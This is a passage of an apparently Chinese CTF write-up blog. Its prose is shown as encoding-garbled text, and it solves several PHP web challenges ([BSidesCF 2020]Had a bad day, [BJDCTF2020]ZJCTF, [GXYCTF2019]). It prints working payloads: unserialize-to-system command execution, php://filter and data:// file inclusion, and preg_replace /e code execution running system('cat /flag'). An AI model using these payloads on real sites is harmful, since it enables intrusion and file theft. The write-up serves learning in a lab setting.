class="hljs-variable">&amp;p</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:<span class="hljs-punctuation">&#123;</span>s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//bg.jpg index.php index.php</span><br><br><span class="hljs-attr">func</span><span class="hljs-operator">=</span>unserialize<span class="hljs-variable">&amp;p</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:<span class="hljs-punctuation">&#123;</span>s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></code></pre></td></tr></table></figure><p>flagåº”è¯¥æ˜¯è—åˆ°äº†æ›´éšè”½çš„ä½ç½®</p><p>ç”¨findå‘½ä»¤å…¨å±€æŸ¥æ‰¾<br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/XR86EVQQXJ4OGAGCIE6.png"><br>&#x2F;tmp&#x2F;flagoefiu4r93æ˜¯flagçš„æ­£ç¡®ä½ç½®<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br><span class="hljs-regexp">//</span>flag&#123;d9827631-f2f1-<span class="hljs-number">407</span>b-<span class="hljs-number">9</span>ee9-<span class="hljs-number">5</span>fc84da1246a&#125;<br></code></pre></td></tr></table></figure><p>ç”¨readfileä¹Ÿå¯ä»¥<br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=readfile&amp;p=/tmp/flagoefiu4r93<br><br><span class="hljs-attribute">or</span><br><br><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;/tmp/flagoefiu4r93&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;readfile&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>æºä»£ç æ²¡æœ‰é€æ¼å‡ºä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯<br>éšä¾¿è¿›å…¥ä¸€ä¸ªé€‰é¡¹<br>çœ‹äº†çœ‹urlæ ï¼Œ?category&#x3D;woofersï¼Œåº”è¯¥å­˜åœ¨sqlæ³¨å…¥<br><img src="/images/VR1N6OQCRZJXPPOO7AQX.png"><br>æŠ¥é”™ä¿¡æ¯æå–åˆ°includeï¼Œå’ŒåŠ äº†.phpåç¼€<br>includeçš„è¯æˆ‘ä»¬ä½¿ç”¨ä¼ªåè®®<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index<br></code></pre></td></tr></table></figure><p>è¿”å›ä¸€å¤§ä¸²base64ç¼–ç è§£ç åæŸ¥çœ‹æºç <br>æºç ä¸­å¤¹æ‚äº†phpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;category&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br><span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>if(true||false||false)</code><br>è¿”å›çš„ç»“æœæ˜¯trueï¼Œä¹Ÿå°±æ˜¯æ»¡è¶³ä¸€ä¸ªæ¡ä»¶æˆç«‹å³å¯ï¼Œæˆ‘ä»¬ç°åœ¨è¦è¯»å–çš„æ˜¯flag.php<br>ä½¿ç”¨ç›¸å¯¹è·¯å¾„<br>ç›¸å¯¹è·¯å¾„è®¡ç®—æ—¶ä¸­é—´ç›®å½•ä¸å­˜åœ¨å¹¶ä¸å½±å“</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=woofers<span class="hljs-regexp">/../</span>flag<br><span class="hljs-regexp">//</span>PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7ZWE3NTMyYTktYTRjYS00MDA0LWIzOTEtZDAzZmY4Nzc3YmM0fQo/Pgo= <br></code></pre></td></tr></table></figure><p>è§£ç åå°±èƒ½å¾—åˆ°flagäº†</p><p>è¿˜å¯ä»¥åˆ©ç”¨php:&#x2F;&#x2F;filterä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®è¯»å–flag.php<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/i</span>ndex/resource=flag<br></code></pre></td></tr></table></figure><p>å¥—ä¸€ä¸ªå­—ç¬¦indexç¬¦åˆæ¡ä»¶å¹¶ä¸”ä¼ å…¥flagï¼Œè¯»å–flag.php<br>å¯ä»¥å‘ç°å½“phpå®šä½ä¸åˆ°æˆ‘ä»¬è‡ªå·±åŠ çš„filteræ—¶ä¼šæŠ¥warning<br>ä½†å¹¶æ²¡æœ‰å½±å“æ‰§è¡Œ</p><h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªifç”¨dataä¼ªåè®®é€šè¿‡,flagè¢«ç¦ç”¨äº†ï¼Œé‚£ä¹ˆè¯»è¯»æ³¨é‡Šé‡Œnext.php é‡Œçš„å†…å®¹<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=<span class="hljs-keyword">next</span>.php<br></code></pre></td></tr></table></figure><p>next.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>preg_replaceçš„&#x2F;eæ¨¡å¼å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´,ä¸çŸ¥é“è¿™ä¸ª$_SESSION[â€˜idâ€™]æ˜¯ä»€ä¹ˆé¬¼<br><a href="https://xz.aliyun.com/t/2557">ä¼ é€é—¨</a>éå¸¸è¯¦ç»†<br>å…ˆæ¥æå®šè¿™ä¸¤ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=<span class="hljs-variable">$&#123;</span>phpinfo()&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸæ˜¾ç¤ºæˆ‘ä»¬éœ€è¦æ˜¾ç¤ºçš„å†…å®¹<br><img src="/images/M4DDC2IQVG3UJ5UHXDSK.png"><br>éœ€è¦ä¼ å…¥$cmdå‚æ•°ï¼Œç„¶åevalæ‰§è¡Œæ‹¿åˆ°flag<br>getFlagæ²¡æœ‰è¢«è°ƒç”¨<br>è°ƒç”¨ä¸€ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;<span class="hljs-attribute">cmd</span>=phpinfo();<br></code></pre></td></tr></table></figure><p>æˆåŠŸï¼Œå¼€å§‹rce</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=<span class="hljs-variable">$&#123;</span>getFlag()&#125;&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>å¼€å§‹é¡µé¢æœªæ‰¾åˆ°å¯åˆ©ç”¨ä¿¡æ¯ï¼ŒæŠ“åŒ…ä¹Ÿä»€ä¹ˆæ²¡æœ‰å‘ç°<br>ç”¨dirsearchæœæœ<br><img src="/images/FGQ77UZZI9ZN0I.png"><br>å‡ºç°äº†å¾ˆå¤š.gitåç¼€çš„æ–‡ä»¶ï¼Œç¡®å®šä¸ºgitæºç æ³„éœ²<br>ä½¿ç”¨githackæ‰«ä¸€æ‰«<br>æ‰«å‡ºäº†ç½‘ç«™çš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¼€å§‹ä»£ç å®¡è®¡<br>è¿™ä¸€é¢˜æœ‰å¾ˆå¤šçš„è¿‡æ»¤<br>ç¬¬äºŒä¸ªifè¿‡æ»¤è®©phpä¼ªåè®®dataåè®®éƒ½ä¸èƒ½ç”¨äº†<br>ç¬¬äºŒä¸ªif</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, NULL, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])</span></span>)<br></code></pre></td></tr></table></figure><p><code>[a-z,_]+ : [a-z,_]</code><br>åŒ¹é…å°å†™å­—æ¯å’Œä¸‹åˆ’çº¿ +è¡¨ç¤º1åˆ°å¤šä¸ª</p><p><code>(?R)?</code><br>(?R)ä»£è¡¨å½“å‰è¡¨è¾¾å¼ï¼Œå°±æ˜¯è¿™ä¸ª<code>(/[a-z,_]+((?R)?)/)</code>ï¼Œæ‰€ä»¥ä¼šä¸€ç›´é€’å½’ï¼Œ?è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–1æ¬¡ï¼ˆè‹¥æ˜¯(?R)*åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…<code>a(b(c()d())))</code></p><p>å¦‚æœä¼ è¿›å»çš„å€¼æ˜¯å­—ç¬¦ä¸²æ¥ä¸€ä¸ª()ï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²å°±ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œå¦‚æœ(é€’å½’)æ›¿æ¢åçš„å­—ç¬¦ä¸²åªå‰©ä¸‹<code>;</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ è¿›å»çš„expå°±ä¼šè¢«evalæ‰§è¡Œã€‚æ¯”å¦‚æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ª<code>phpinfo();</code>,ä»–è¢«æ›¿æ¢åå°±å‰©ä¸‹<code>;</code>,é‚£ä¹ˆæ›´å…·æ¡ä»¶å°±ä¼šæ‰§è¡Œ<code>phpinfo();</code></p><p>è€Œ(?R)?èƒ½åŒ¹é…çš„åªæœ‰<code>a(b()); a(b(c()));</code>è¿™ç§ç±»å‹çš„ï¼Œæ¯”å¦‚ä¼ å…¥<code>a(b(c()));</code>,ç¬¬ä¸€æ¬¡åŒ¹é…åï¼Œå°±å‰©<code>a(b())</code>,ç¬¬äºŒæ¬¡åŒ¹é…å,<code>a();</code>,ç¬¬ä¸‰æ¬¡åŒ¹é…åå°±å‰©ä¸‹<code>;</code>äº†ï¼Œæœ€å<code>a(b(c()))</code>å°±ä¼šè¢«evalæ‰§è¡Œã€‚</p><p>è¿™é¢˜çš„æ€è·¯åˆ°è¿™å°±å¾ˆæ˜ç¡®äº†ï¼Œä½¿ç”¨æ— å‚RCE<br>ä¸‹é¢æ˜¯æ— å‚RCEçš„å¸¸ç”¨å‡½æ•°</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getchwd</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">dirname</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚<br><span class="hljs-function"><span class="hljs-title">chdir</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚<br><span class="hljs-function"><span class="hljs-title">readfile</span><span class="hljs-params">()</span></span>ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span>ï¼š<span class="hljs-built_in">current</span>() çš„åˆ«åã€‚<br><span class="hljs-function"><span class="hljs-title">next</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br><span class="hljs-function"><span class="hljs-title">end</span><span class="hljs-params">()</span></span>ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br><span class="hljs-function"><span class="hljs-title">array_rand</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">array_flip</span><span class="hljs-params">()</span></span>ï¼š<span class="hljs-built_in">array_flip</span>() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚<br><span class="hljs-function"><span class="hljs-title">array_slice</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚<br><span class="hljs-function"><span class="hljs-title">array_reverse</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">chr</span><span class="hljs-params">()</span></span> å‡½æ•°ä»æŒ‡å®šçš„ï¼šASCII å€¼è¿”å›å­—ç¬¦ã€‚<br><span class="hljs-function"><span class="hljs-title">hex2bin</span><span class="hljs-params">()</span></span>ï¼šâ€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚<br><span class="hljs-function"><span class="hljs-title">getenv</span><span class="hljs-params">()</span></span>ï¼šè·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨<span class="hljs-number">7.1</span>ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)ã€‚<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ 